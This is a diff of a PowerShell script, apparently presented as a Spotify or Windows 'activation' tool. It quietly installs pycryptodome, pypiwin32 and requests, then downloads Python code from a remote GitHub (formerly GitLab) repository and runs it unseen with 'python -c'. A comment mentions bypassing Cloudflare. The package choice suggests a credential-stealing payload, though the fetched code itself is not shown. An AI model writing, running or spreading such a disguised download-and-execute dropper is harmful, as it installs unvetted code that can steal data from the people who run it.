@@ -1,17 +1,16 @@
 # [1] Check for Python
 try {
-    $pythonCheck = python --version 2>&1
-    if (-not $pythonCheck) { throw }
+    $null = python --version 2>&1
 } catch {
-    Write-Host "⚠️ Python not found. Download from: https://python.org"
-    exit 1
+    Write-Host "⚠️ Install Python first: https://python.org"
+    exit
 }
 
-# [2] Install ONLY these packages
-$packages = "pycryptodome", "pypiwin32", "requests"
+# [2] Install required packages
 python -m pip install --upgrade pip --quiet
-python -m pip install $packages --quiet --no-warn-script-location
+python -m pip install pycryptodome pypiwin32 requests --quiet --no-warn-script-location
 
-# [3] Execute Python script directly from URL
-$pythonScript = Invoke-RestMethod "https://gitlab.com/win_activate/ACTIVATE/-/snippets/4880892/raw/main/Spotify.py"
-python -c $pythonScript
+# [3] Execute Python script from GitHub (bypassing Cloudflare)
+$pythonScriptUrl = "https://raw.githubusercontent.com/QUADROisCoding/EZ_ACTIVATE/main/Spotify_version.py"
+$pythonCode = (Invoke-WebRequest $pythonScriptUrl -UseBasicParsing).Content
+python -c $pythonCode
